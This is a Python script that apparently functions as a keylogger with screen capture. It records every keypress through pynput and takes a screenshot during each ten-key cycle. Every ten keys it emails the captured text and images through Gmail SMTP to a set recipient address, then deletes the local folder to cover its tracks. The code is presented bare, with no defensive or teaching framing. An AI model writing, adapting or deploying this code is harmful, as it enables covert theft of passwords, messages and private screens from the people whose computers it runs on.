import pyautogui
import time, os, smtplib, shutil
from email.message import EmailMessage
import pynput
from pynput.keyboard import Key, Listener

def send_mail(body):
    try:
        msg = EmailMessage()
        msg["From"] = "Senderemail@gmail.com"
        msg["To"] = "Receiveremail@gmail.com"
        msg["Subject"] = "Screen_logs"
        msg.set_content(body)
        images = os.listdir("Tempshots")
        path = "C:\\Tempshots\\"
        for image in images:
            file = open(path+image, "rb")
            data = file.read()
            file_name = file.name
            msg.add_attachment(data, maintype = "image", subtype = "png", filename = file_name)
            file.close()
        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.ehlo()
        server.starttls()
        server.login("Senderemail@gmail.com", "Password")
        server.send_message(msg)
        server.close()
        shutil.rmtree("Tempshots")
    except Exception as mail_error:
        shutil.rmtree("Tempshots")
        print(mail_error)
        pass


os.chdir("C:\\")
count = 0
keys = []

def on_press(key):
    global keys, count
    print(key, end= " ")
    print("entered")
    keys.append(str(key))
    keys.append('\n')
    if "Tempshots" not in os.listdir("C:"):
        os.mkdir("C:Tempshots")
    if count == 5:
        pic = pyautogui.screenshot()
        pic.save("C:\\Tempshots\\Screenshot_"+str(count)+".png")
    count += 1
    print(count)
    if count == 10:
        email(keys)
        keys = []
        count = 0
def email(keys):
    message = ""
    for key in keys:
        k = key.replace("'", "'")
        if key == "Key.space":
            k = " "
        elif key.find("Key")>0:
            k = ""
        message += k
    print(message)
    send_mail(message)

def on_release(key):
    if key == Key.esc:
        return False

with Listener(on_press = on_press, on_release = on_release) as listener:
    listener.join()